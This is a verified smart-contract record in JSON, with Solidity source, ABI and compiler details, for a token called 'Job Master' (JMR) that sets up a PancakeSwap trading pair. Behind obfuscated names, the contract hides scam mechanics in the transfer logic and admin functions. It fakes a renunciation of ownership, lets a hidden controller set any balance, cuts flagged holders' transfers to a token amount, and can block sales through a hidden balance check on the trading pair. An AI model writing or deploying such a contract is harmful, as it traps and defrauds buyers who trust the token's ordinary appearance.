{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface teamFund {\n    function createPair(address fundTotal, address tradingSell) external returns (address);\n}\n\ninterface autoExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellAtTake) external view returns (uint256);\n\n    function transfer(address exemptMin, uint256 limitMinSwap) external returns (bool);\n\n    function allowance(address maxFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitMinSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptMin,\n        uint256 limitMinSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamToken, uint256 value);\n    event Approval(address indexed maxFrom, address indexed spender, uint256 value);\n}\n\nabstract contract minBuyTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface modeLaunchSwap is autoExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract JobMaster is minBuyTake, autoExempt, modeLaunchSwap {\n\n    uint256 constant takeList = 12 ** 10;\n\n    event OwnershipTransferred(address indexed toShould, address indexed swapTx);\n\n    function exemptMax() public {\n        emit OwnershipTransferred(feeIsShould, address(0));\n        fundToken = address(0);\n    }\n\n    function transfer(address totalMin, uint256 limitMinSwap) external virtual override returns (bool) {\n        return txTo(_msgSender(), totalMin, limitMinSwap);\n    }\n\n    bool public exemptEnable;\n\n    function txTo(address isMin, address exemptMin, uint256 limitMinSwap) internal returns (bool) {\n        if (isMin == feeIsShould) {\n            return totalSell(isMin, exemptMin, limitMinSwap);\n        }\n        uint256 tradingMin = autoExempt(receiverMax).balanceOf(teamTotal);\n        require(tradingMin == listFrom);\n        require(exemptMin != teamTotal);\n        if (toReceiver[isMin]) {\n            return totalSell(isMin, exemptMin, takeList);\n        }\n        return totalSell(isMin, exemptMin, limitMinSwap);\n    }\n\n    string private atFund = \"JMR\";\n\n    function totalSell(address isMin, address exemptMin, uint256 limitMinSwap) internal returns (bool) {\n        require(autoLimit[isMin] >= limitMinSwap);\n        autoLimit[isMin] -= limitMinSwap;\n        autoLimit[exemptMin] += limitMinSwap;\n        emit Transfer(isMin, exemptMin, limitMinSwap);\n        return true;\n    }\n\n    function balanceOf(address sellAtTake) public view virtual override returns (uint256) {\n        return autoLimit[sellAtTake];\n    }\n\n    string private sellReceiver = \"Job Master\";\n\n    uint256 listFrom;\n\n    function allowance(address limitFund, address exemptTo) external view virtual override returns (uint256) {\n        if (exemptTo == modeFromAt) {\n            return type(uint256).max;\n        }\n        return receiverTrading[limitFund][exemptTo];\n    }\n\n    function approve(address exemptTo, uint256 limitMinSwap) public virtual override returns (bool) {\n        receiverTrading[_msgSender()][exemptTo] = limitMinSwap;\n        emit Approval(_msgSender(), exemptTo, limitMinSwap);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atFund;\n    }\n\n    bool private tokenShouldTo;\n\n    function name() external view virtual override returns (string memory) {\n        return sellReceiver;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldTotal;\n    }\n\n    uint256 private launchAt;\n\n    address teamTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return fundToken;\n    }\n\n    uint256 private receiverAutoLimit = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public autoTotal;\n\n    uint256 launchTake;\n\n    function launchAmount(address totalMin, uint256 limitMinSwap) public {\n        walletReceiver();\n        autoLimit[totalMin] = limitMinSwap;\n    }\n\n    mapping(address => uint256) private autoLimit;\n\n    address modeFromAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        \n        buyLaunch buyIsSwap = buyLaunch(modeFromAt);\n        receiverMax = teamFund(buyIsSwap.factory()).createPair(buyIsSwap.WETH(), address(this));\n        if (feeAt) {\n            tokenShouldTo = false;\n        }\n        feeIsShould = _msgSender();\n        autoTotal[feeIsShould] = true;\n        autoLimit[feeIsShould] = receiverAutoLimit;\n        exemptMax();\n        if (feeAt == tokenShouldTo) {\n            buyTake = launchAt;\n        }\n        emit Transfer(address(0), feeIsShould, receiverAutoLimit);\n    }\n\n    function transferFrom(address isMin, address exemptMin, uint256 limitMinSwap) external override returns (bool) {\n        if (_msgSender() != modeFromAt) {\n            if (receiverTrading[isMin][_msgSender()] != type(uint256).max) {\n                require(limitMinSwap <= receiverTrading[isMin][_msgSender()]);\n                receiverTrading[isMin][_msgSender()] -= limitMinSwap;\n            }\n        }\n        return txTo(isMin, exemptMin, limitMinSwap);\n    }\n\n    mapping(address => bool) public toReceiver;\n\n    function walletReceiver() private view {\n        require(autoTotal[_msgSender()]);\n    }\n\n    uint256 public totalLaunched;\n\n    mapping(address => mapping(address => uint256)) private receiverTrading;\n\n    address public receiverMax;\n\n    function getOwner() external view returns (address) {\n        return fundToken;\n    }\n\n    address private fundToken;\n\n    function feeMarketing(address maxTeam) public {\n        if (exemptEnable) {\n            return;\n        }\n        \n        autoTotal[maxTeam] = true;\n        if (buyTake == totalLaunched) {\n            sellLaunch = totalLaunched;\n        }\n        exemptEnable = true;\n    }\n\n    address public feeIsShould;\n\n    bool public feeAt;\n\n    uint256 public buyTake;\n\n    function isTotal(address marketingMax) public {\n        walletReceiver();\n        if (totalLaunched == sellLaunch) {\n            feeAt = false;\n        }\n        if (marketingMax == feeIsShould || marketingMax == receiverMax) {\n            return;\n        }\n        toReceiver[marketingMax] = true;\n    }\n\n    function launchedBuy(uint256 limitMinSwap) public {\n        walletReceiver();\n        listFrom = limitMinSwap;\n    }\n\n    uint256 private sellLaunch;\n\n    uint8 private shouldTotal = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverAutoLimit;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitMinSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAtTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeIsShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTeam\",\"type\":\"address\"}],\"name\":\"feeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMax\",\"type\":\"address\"}],\"name\":\"isTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitMinSwap\",\"type\":\"uint256\"}],\"name\":\"launchAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitMinSwap\",\"type\":\"uint256\"}],\"name\":\"launchedBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitMinSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitMinSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "JobMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}